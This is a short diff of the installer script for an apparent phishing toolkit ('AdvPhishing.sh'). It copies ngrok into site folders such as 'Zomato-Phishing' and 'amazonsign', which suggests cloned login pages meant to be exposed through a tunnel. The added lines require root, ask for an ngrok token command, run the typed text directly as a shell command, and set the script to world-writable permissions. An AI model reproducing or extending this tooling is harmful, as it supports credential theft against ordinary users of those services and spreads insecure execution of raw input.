@@ -1,8 +1,15 @@
 #!/bin/bash
 echo ""
 clear
-echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m >> MUST ROOT ! >> \e[0m'
-sleep 5
+echo ""
+echo ""
+echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m !!! MUST ROOT OTHERWISE SCRIPT NOT WORKING PROPERLY !!!    \e[0m'
+sleep 8
+clear
+echo ""
+echo ""
+read -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
+$token
 clear
 echo ""
 echo ""
@@ -37,4 +44,5 @@ cp -R ngrok sites/Zomato-Phishing/
 cp -R ngrok sites/amazonsign/
 chmod 7777 AdvPhishing.sh
 clear
+
 
